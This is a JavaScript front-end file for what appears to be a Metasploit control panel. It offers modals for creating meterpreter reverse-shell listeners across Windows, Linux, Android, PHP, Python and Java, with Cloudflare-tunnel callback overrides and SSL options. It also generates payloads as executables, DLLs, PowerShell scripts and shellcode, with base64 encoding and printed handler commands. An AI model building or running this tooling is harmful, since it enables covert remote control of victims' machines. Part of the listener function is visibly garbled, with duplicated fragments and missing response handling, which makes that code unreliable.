                    <option value="java/meterpreter/reverse_tcp">java/meterpreter/reverse_tcp</option>
                    <option value="python/meterpreter_reverse_https">python/meterpreter_reverse_https</option>
                    <option value="python/meterpreter_reverse_tcp">python/meterpreter_reverse_tcp</option>
                    <option value="python/meterpreter/reverse_https">python/meterpreter/reverse_https</option>
                    <option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option>
                    <option value="php/meterpreter_reverse_tcp">php/meterpreter_reverse_tcp</option>
                    <option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option>
                    <option value="php/reverse_php">php/reverse_php</option>
                </optgroup>
                <optgroup label="── Android ──">
                    <option value="android/meterpreter_reverse_https">android/meterpreter_reverse_https</option>
                    <option value="android/meterpreter_reverse_tcp">android/meterpreter_reverse_tcp</option>
                    <option value="android/meterpreter/reverse_https">android/meterpreter/reverse_https</option>
                    <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
                </optgroup>
            </select>
        </div>
        
        <div class="modal-form-row">
            <div class="modal-form-group modal-form-half">
                <label class="modal-label">LHOST</label>
                <input type="text" class="modal-input" id="listener-lhost" value="0.0.0.0" placeholder="0.0.0.0">
            </div>
            <div class="modal-form-group modal-form-half">
                <label class="modal-label">LPORT</label>
                <input type="number" class="modal-input" id="listener-lport" value="8443" min="1" max="65535">
            </div>
        </div>
        
        <div class="modal-form-row">
            <div class="modal-form-group modal-form-half">
                <label class="modal-label">OverrideLHOST <span style="color:#666;font-size:10px">(Cloudflare)</span></label>
                <input type="text" class="modal-input" id="listener-override-lhost" placeholder="xxx.trycloudflare.com">
            </div>
            <div class="modal-form-group modal-form-half">
                <label class="modal-label">OverrideLPORT</label>
                <input type="number" class="modal-input" id="listener-override-lport" value="443" min="1" max="65535">
            </div>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label modal-checkbox-label">
                <input type="checkbox" id="listener-override-request-host" checked>
                <span>OverrideRequestHost</span>
            </label>
        </div>
        
        <div class="modal-form-group" id="ssl-options">
            <label class="modal-label modal-checkbox-label">
                <input type="checkbox" id="listener-ssl" checked onchange="toggleSSLCert()">
                <span>Enable SSL</span>
            </label>
            <div id="ssl-cert-group" style="margin-top: 8px;">
                <label class="modal-label">HandlerSSLCert (Certificate Pinning)</label>
                <select class="modal-select" id="listener-ssl-cert">
                    <option value="certs/server.pem">certs/server.pem</option>
                    <option value="certs/server_bundle.pem">certs/server_bundle.pem</option>
                </select>
                <div style="margin-top: 8px;">
                    <label class="modal-label modal-checkbox-label">
                        <input type="checkbox" id="listener-stager-verify" checked>
                        <span>StagerVerifySSLCert (uncheck for cloudflare)</span>
                    </label>
                </div>
            </div>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label modal-checkbox-label">
                <input type="checkbox" id="listener-enable-stage-encoding">
                <span>EnableStageEncoding (uncheck for stageless)</span>
            </label>
        </div>
        
        <div id="listener-status"></div>
    `;
    
    footer.innerHTML = `
        <button type="button" class="modal-btn modal-btn-secondary" onclick="closeCyberModal()">Cancel</button>
        <button type="button" class="modal-btn modal-btn-primary" id="create-listener-btn" onclick="executeCreateListener()">
            🎯 Create
        </button>
    `;
    
    modal.classList.remove('hidden');
    modal.style.display = 'flex';
    loadSSLCerts();
    updateSSLOption();
    setTimeout(() => document.getElementById('listener-lhost').focus(), 100);
}

async function loadSSLCerts() {
    try {
        const response = await fetch('/api/msf/certs', {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const data = await response.json();
        
        if (data.certs && data.certs.length > 0) {
            const select = document.getElementById('listener-ssl-cert');
            if (select) {
                select.innerHTML = data.certs.map(cert => 
                    `<option value="${cert.path}">${cert.name}</option>`
                ).join('');
            }
        }
    } catch (e) {
        console.log('Could not load SSL certs:', e);
    }
}

function updateSSLOption() {
    const payload = document.getElementById('listener-payload')?.value || '';
    const isHttps = payload.includes('https');
    const sslCheckbox = document.getElementById('listener-ssl');
    const sslCertGroup = document.getElementById('ssl-cert-group');
    
    if (sslCheckbox && sslCertGroup) {
        if (isHttps) {
            sslCheckbox.checked = true;
            sslCheckbox.disabled = true;
            sslCertGroup.style.display = 'block';
        } else {
            sslCheckbox.disabled = false;
            toggleSSLCert();
        }
    }
}

function toggleSSLCert() {
    const sslEnabled = document.getElementById('listener-ssl')?.checked || false;
    const sslCertGroup = document.getElementById('ssl-cert-group');
    if (sslCertGroup) {
        sslCertGroup.style.display = sslEnabled ? 'block' : 'none';
    }
}

async function executeCreateListener() {
    const payload = document.getElementById('listener-payload').value;
    const lhost = document.getElementById('listener-lhost').value;
    const lport = document.getElementById('listener-lport').value;
    const overrideLhost = document.getElementById('listener-override-lhost')?.value || '';
    const overrideLport = document.getElementById('listener-override-lport')?.value || '';
    const overrideRequestHost = document.getElementById('listener-override-request-host')?.checked || false;
    const statusDiv = document.getElementById('listener-status');
    const createBtn = document.getElementById('create-listener-btn');
    
    if (!lhost || !lport) {
        statusDiv.innerHTML = '<div class="modal-status error">⚠️ Fill in all fields</div>';
        return;
    }
    
    createBtn.disabled = true;
    createBtn.innerHTML = '⏳ Creating...';
    statusDiv.innerHTML = '<div class="modal-status">⏳ Creating listener...</div>';
    
    printLine(`[*] Creating listener: ${payload} on ${lhost}:${lport}...`, 'info');
    
    const sslEnabled = document.getElementById('listener-ssl')?.checked || false;
    const sslCert = document.getElementById('listener-ssl-cert')?.value || null;
    const stagerVerify = document.getElementById('listener-stager-verify')?.checked || false;
    const enableStageEncoding = document.getElementById('listener-enable-stage-encoding')?.checked || false;
    
    try {
        const response = await fetch('/api/msf/listener', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                payload, 
                lhost, 
                lport: parseInt(lport),
                ssl: sslEnabled,
                ssl_cert: sslEnabled ? sslCert : null,
                stager_verify_ssl_cert: stagerVerify,
                enable_stage_encoding: enableStageEncoding,
                override_lhost: overrideLhost || null,
                override_lport: overrideLport ? parseInt(overrideLport) : null,
                override_request_host: overrideRequestHost
            })
        });
            printLine(`[+] Listener created: Job #${data.job_id || 'handler'}`, 'success');
            printLine(`    Payload: ${payload}`, 'dim');
            printLine(`    Listening: ${lhost}:${lport}`, 'dim');
            if (overrideLhost) printLine(`    OverrideLHOST: ${overrideLhost}:${overrideLport}`, 'dim');
            if (sslEnabled) {
                printLine(`    HandlerSSLCert: ${sslCert || 'enabled'}`, 'dim');
                printLine(`    StagerVerifySSLCert: ${stagerVerify}`, 'dim');
                printLine(`    EnableStageEncoding: ${enableStageEncoding}`, 'dim');
            }success');
            printLine(`    Payload: ${payload}`, 'dim');
            printLine(`    Listening: ${lhost}:${lport}`, 'dim');
            if (overrideLhost) printLine(`    OverrideLHOST: ${overrideLhost}:${overrideLport}`, 'dim');
            if (sslEnabled) printLine(`    SSL: ${sslCert || 'enabled'}`, 'dim');
            
            refreshJobsUI();
            setTimeout(() => closeCyberModal(), 1500);
        } else {
            statusDiv.innerHTML = `<div class="modal-status error">❌ ${data.error || 'Failed'}</div>`;
            printLine('[-] ' + (data.error || 'Failed to create listener'), 'error');
            createBtn.disabled = false;
            createBtn.innerHTML = '🎯 Create';
        }
    } catch (e) {
        statusDiv.innerHTML = `<div class="modal-status error">❌ ${e.message}</div>`;
        printLine('[-] Error: ' + e.message, 'error');
        createBtn.disabled = false;
        createBtn.innerHTML = '🎯 Create';
    }
}

// ============================================================================
// PAYLOAD GENERATOR MODAL
// ============================================================================
function showPayloadModal() {
    if (!msfConnected) {
        printLine('[-] Connect to MSF first', 'error');
        return;
    }
    
    const modal = document.getElementById('cyber-modal');
    const title = document.getElementById('modal-title');
    const body = document.getElementById('modal-body');
    const footer = document.getElementById('modal-footer');
    
    title.textContent = 'GENERATE PAYLOAD';
    
    body.innerHTML = `
        <div class="modal-form-group">
            <label class="modal-label">Operating System</label>
            <select class="modal-select" id="payload-os" onchange="updatePayloadOptions()">
                <option value="windows">Windows</option>
                <option value="linux">Linux</option>
            </select>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label">Architecture</label>
            <select class="modal-select" id="payload-arch" onchange="updatePayloadOptions()">
                <option value="x64">x64 (64-bit)</option>
                <option value="x86">x86 (32-bit)</option>
            </select>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label">Protocol</label>
            <select class="modal-select" id="payload-protocol" onchange="updatePayloadOptions()">
                <option value="https">HTTPS (encrypted, recommended)</option>
                <option value="http">HTTP</option>
                <option value="tcp">TCP</option>
            </select>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label">Payload Type</label>
            <select class="modal-select" id="payload-type" onchange="updatePayloadString()">
                <option value="stageless">Stageless (single payload, larger)</option>
                <option value="staged">Staged (two-stage, smaller initial)</option>
            </select>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label">Full Payload String</label>
            <input type="text" class="modal-input" id="payload-string" readonly style="background:#222; color:#0f0; font-family:monospace; font-size:11px;">
        </div>
        
        <div class="modal-form-row">
            <div class="modal-form-group modal-form-half">
                <label class="modal-label">LHOST (Callback)</label>
                <input type="text" class="modal-input" id="payload-lhost" value="192.168.1.100" placeholder="IP or domain">
            </div>
            <div class="modal-form-group modal-form-half">
                <label class="modal-label">LPORT</label>
                <input type="number" class="modal-input" id="payload-lport" value="443" min="1" max="65535">
            </div>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label">Output Format</label>
            <select class="modal-select" id="payload-format">
                <option value="raw">Raw Shellcode (binary)</option>
                <option value="exe">Windows Executable (.exe)</option>
                <option value="dll">Windows DLL (.dll)</option>
                <option value="ps1">PowerShell Script (.ps1)</option>
                <option value="python">Python</option>
                <option value="c">C Array</option>
            </select>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label">Output Filename</label>
            <input type="text" class="modal-input" id="payload-filename" placeholder="shellcode.txt (auto-generated if empty)">
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label modal-checkbox-label">
                <input type="checkbox" id="payload-save" checked>
                <span>Save to /payloads/ directory</span>
            </label>
        </div>
        
        <div class="modal-form-group">
            <label class="modal-label modal-checkbox-label">
                <input type="checkbox" id="payload-base64">
                <span>Also create base64-encoded version</span>
            </label>
        </div>
        
        <div id="payload-status"></div>
    `;
    
    footer.innerHTML = `
        <button type="button" class="modal-btn modal-btn-secondary" onclick="closeCyberModal()">Cancel</button>
        <button type="button" class="modal-btn modal-btn-primary" id="generate-payload-btn" onclick="executeGeneratePayload()">
            ⚙️ Generate
        </button>
    `;
    
    modal.classList.remove('hidden');
    modal.style.display = 'flex';
    updatePayloadOptions();
    setTimeout(() => document.getElementById('payload-lhost').focus(), 100);
}

function updatePayloadOptions() {
    const os = document.getElementById('payload-os')?.value || 'windows';
    const arch = document.getElementById('payload-arch')?.value || 'x64';
    const protocol = document.getElementById('payload-protocol')?.value || 'https';
    
    // Show/hide architecture option for Linux
    const archSelect = document.getElementById('payload-arch');
    if (os === 'linux' && arch === 'x86') {
        archSelect.value = 'x64'; // Force x64 for Linux
    }
    
    // Update format options based on OS
    const formatSelect = document.getElementById('payload-format');
    if (formatSelect) {
        if (os === 'linux') {
            formatSelect.innerHTML = `
                <option value="raw">Raw Shellcode (binary)</option>
                <option value="elf">ELF Executable</option>
                <option value="python">Python</option>
                <option value="c">C Array</option>
            `;
        } else {
            formatSelect.innerHTML = `
                <option value="raw">Raw Shellcode (binary)</option>
                <option value="exe">Windows Executable (.exe)</option>
                <option value="dll">Windows DLL (.dll)</option>
                <option value="ps1">PowerShell Script (.ps1)</option>
                <option value="python">Python</option>
                <option value="c">C Array</option>
            `;
        }
    }
    
    updatePayloadString();
}

function updatePayloadString() {
    const os = document.getElementById('payload-os')?.value || 'windows';
    const arch = document.getElementById('payload-arch')?.value || 'x64';
    const protocol = document.getElementById('payload-protocol')?.value || 'https';
    const type = document.getElementById('payload-type')?.value || 'stageless';
    
    let payloadString = '';
    
    if (os === 'windows') {
        if (arch === 'x64') {
            if (type === 'stageless') {
                payloadString = `windows/x64/meterpreter_reverse_${protocol}`;
            } else {
                payloadString = `windows/x64/meterpreter/reverse_${protocol}`;
            }
        } else { // x86
            if (type === 'stageless') {
                payloadString = `windows/meterpreter_reverse_${protocol}`;
            } else {
                payloadString = `windows/meterpreter/reverse_${protocol}`;
            }
        }
    } else { // linux
        if (type === 'stageless') {
            payloadString = `linux/x64/meterpreter_reverse_${protocol}`;
        } else {
            payloadString = `linux/x64/meterpreter/reverse_${protocol}`;
        }
    }
    
    document.getElementById('payload-string').value = payloadString;
}

async function executeGeneratePayload() {
    const payload = document.getElementById('payload-string').value;
    const lhost = document.getElementById('payload-lhost').value;
    const lport = document.getElementById('payload-lport').value;
    const format = document.getElementById('payload-format').value;
    const filename = document.getElementById('payload-filename').value;
    const save = document.getElementById('payload-save').checked;
    const base64Encode = document.getElementById('payload-base64').checked;
    const statusDiv = document.getElementById('payload-status');
    const generateBtn = document.getElementById('generate-payload-btn');
    
    if (!lhost || !lport) {
        statusDiv.innerHTML = '<div class="modal-status error">⚠️ Fill in all fields</div>';
        return;
    }
    
    generateBtn.disabled = true;
    generateBtn.innerHTML = '⏳ Generating...';
    statusDiv.innerHTML = '<div class="modal-status">⏳ Generating payload...</div>';
    
    printLine(`[*] Generating payload: ${payload}...`, 'info');
    printLine(`    LHOST: ${lhost}`, 'dim');
    printLine(`    LPORT: ${lport}`, 'dim');
    printLine(`    Format: ${format}`, 'dim');
    
    try {
        const response = await fetch('/api/msf/generate', {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                payload,
                lhost,
                lport: parseInt(lport),
                format,
                save,
                filename: filename || null,
                ssl: payload.includes('https')
            })
        });
        const data = await response.json();
        
        if (data.success || data.size) {
            const sizeKB = (data.size / 1024).toFixed(2);
            statusDiv.innerHTML = `<div class="modal-status success">✅ Payload generated! (${sizeKB} KB)</div>`;
            printLine(`[+] Payload generated successfully!`, 'success');
            printLine(`    Size: ${data.size} bytes (${sizeKB} KB)`, 'dim');
            if (data.saved) {
                printLine(`    Saved: ${data.filename}`, 'dim');
                printLine(`    Path: ${data.filepath}`, 'dim');
            }
            
            // Show handler command
            printLine(`\n[*] Start handler with:`, 'info');
            printLine(`    use exploit/multi/handler`, 'dim');
            printLine(`    set payload ${payload}`, 'dim');
            printLine(`    set LHOST 0.0.0.0`, 'dim');
            printLine(`    set LPORT ${lport}`, 'dim');
            if (payload.includes('https')) {
                printLine(`    set EnableStageEncoding false`, 'dim');
            }
            printLine(`    exploit -j\n`, 'dim');
            
            setTimeout(() => closeCyberModal(), 2000);
        } else {
            statusDiv.innerHTML = `<div class="modal-status error">❌ ${data.error || 'Failed'}</div>`;
            printLine('[-] ' + (data.error || 'Failed to generate payload'), 'error');
            generateBtn.disabled = false;
            generateBtn.innerHTML = '⚙️ Generate';
        }
    } catch (e) {
        statusDiv.innerHTML = `<div class="modal-status error">❌ ${e.message}</div>`;
        printLine('[-] Error: ' + e.message, 'error');
        generateBtn.disabled = false;
        generateBtn.innerHTML = '⚙️ Generate';
    }
}

